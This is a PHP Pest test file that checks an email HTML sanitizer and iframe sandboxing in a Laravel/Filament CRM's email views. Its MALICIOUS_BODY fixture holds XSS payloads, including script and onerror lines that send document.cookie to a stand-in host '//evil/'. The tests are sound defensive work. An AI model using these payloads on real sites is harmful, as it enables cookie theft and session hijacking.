<?php

declare(strict_types=1);

use App\Models\User;
use App\Support\EmailHtmlSanitizer;
use Filament\Facades\Filament;
use Relaticle\EmailIntegration\Enums\EmailPrivacyTier;
use Relaticle\EmailIntegration\Models\ConnectedAccount;
use Relaticle\EmailIntegration\Models\Email;

mutates(EmailHtmlSanitizer::class);

beforeEach(function (): void {
    $this->owner = User::factory()->withTeam()->create();
    $this->team = $this->owner->currentTeam;

    $this->account = ConnectedAccount::withoutEvents(fn () => ConnectedAccount::factory()->create([
        'team_id' => $this->team->id,
        'user_id' => $this->owner->id,
    ]));

    $this->actingAs($this->owner);
    Filament::setTenant($this->team);
});

function makeEmailWithBody(string $html): Email
{
    /** @var Email $email */
    $email = Email::factory()->create([
        'team_id' => test()->team->id,
        'user_id' => test()->owner->id,
        'connected_account_id' => test()->account->getKey(),
        'privacy_tier' => EmailPrivacyTier::FULL,
    ]);

    $email->body()->create([
        'body_text' => 'plain text',
        'body_html' => $html,
    ]);

    return $email->fresh(['body', 'participants', 'labels', 'attachments']);
}

const MALICIOUS_BODY = '<p>hello <b>world</b></p>'
    .'<script>document.location="//evil/?c="+document.cookie</script>'
    .'<img src=x onerror="fetch(\'//evil/\'+document.cookie)">'
    .'<svg onload="alert(1)"></svg>'
    .'<a href="javascript:alert(2)">click</a>';

it('strips scripts, event handlers and javascript urls from the email view', function (): void {
    $email = makeEmailWithBody(MALICIOUS_BODY);

    $html = view('filament.emails.email-view', ['record' => $email])->render();

    expect($html)
        ->not->toContain('onerror')
        ->not->toContain('onload="alert')
        ->not->toContain('javascript:')
        ->not->toContain('document.cookie')
        ->and($html)->toContain('hello');
});

it('preserves inline styles and presentational attributes used by email layouts', function (): void {
    $email = makeEmailWithBody(
        '<table bgcolor="#eeeeee" width="600"><tr>'
        .'<td align="center" style="color:#ff0000;padding:10px">'
        .'<p class="lead" style="font-weight:bold">Styled</p>'
        .'</td></tr></table>'
    );

    $html = view('filament.emails.email-view', ['record' => $email])->render();

    expect($html)
        ->toContain('bgcolor=&quot;#eeeeee&quot;')
        ->toContain('style=&quot;color:#ff0000;padding:10px&quot;')
        ->toContain('class=&quot;lead&quot;')
        ->toContain('align=&quot;center&quot;');
});

it('renders the email view iframe without a same-origin sandbox', function (): void {
    $email = makeEmailWithBody('<p>body</p>');

    $html = view('filament.emails.email-view', ['record' => $email])->render();

    expect($html)
        ->toContain('<iframe')
        ->toContain('sandbox="allow-popups"')
        ->not->toContain('allow-same-origin');
});

it('strips dangerous markup in the threaded email view', function (): void {
    $email = makeEmailWithBody(MALICIOUS_BODY);

    $html = view('filament.emails.email-thread', ['emails' => collect([$email])])->render();

    expect($html)
        ->not->toContain('onerror')
        ->not->toContain('javascript:')
        ->not->toContain('document.cookie');
});

it('sandboxes the threaded iframe without same-origin access', function (): void {
    $email = makeEmailWithBody('<p>body</p>');

    $html = view('filament.emails.email-thread', ['emails' => collect([$email])])->render();

    expect($html)
        ->toContain('sandbox="allow-scripts allow-popups"')
        ->not->toContain('allow-same-origin');
});
